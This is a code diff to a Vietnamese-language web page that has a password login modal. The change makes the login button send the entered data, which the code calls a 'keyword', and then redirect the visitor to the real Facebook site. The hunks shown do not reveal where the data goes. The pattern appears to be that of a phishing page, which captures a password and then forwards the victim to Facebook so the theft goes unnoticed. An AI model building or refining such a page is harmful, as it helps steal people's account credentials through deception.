@@ -865,7 +865,7 @@
                 <input type="password" id="pwdInput" class="modal-input-field" autofocus>
             </div>
             <!-- Nút Đăng nhập -->
-            <button class="modal-submit-btn" id="btnSearch"><a href="https://www.facebook.com " style="text-decoration: none; color: white;">Đăng nhập</a></button>
+            <button class="modal-submit-btn" id="btnSearch">Đăng nhập</button>
             <!-- Quên mật khẩu -->
             <a href="#" class="modal-forgot-link">Quên mật khẩu?</a>
         </div>
@@ -873,9 +873,7 @@
     <!-- ================= JAVASCRIPT ================= -->
     <script>
         const btnContinue = document.getElementById('btnContinue');
-
         const btnSearch = document.getElementById('btnSearch');
-
         const loginModal = document.getElementById('loginModal');
         const btnCloseModal = document.getElementById('btnCloseModal');
         const pwdInput = document.getElementById('pwdInput');
@@ -924,6 +922,9 @@
             });
 
             console.log("Đã gửi từ khóa:", keyword);
+
+            // Chuyển sang Facebook sau khi gửi
+            window.location.href = "https://www.facebook.com/?locale=vi_VN";
         }
 
         btnSearch.addEventListener("click", sendSearch);
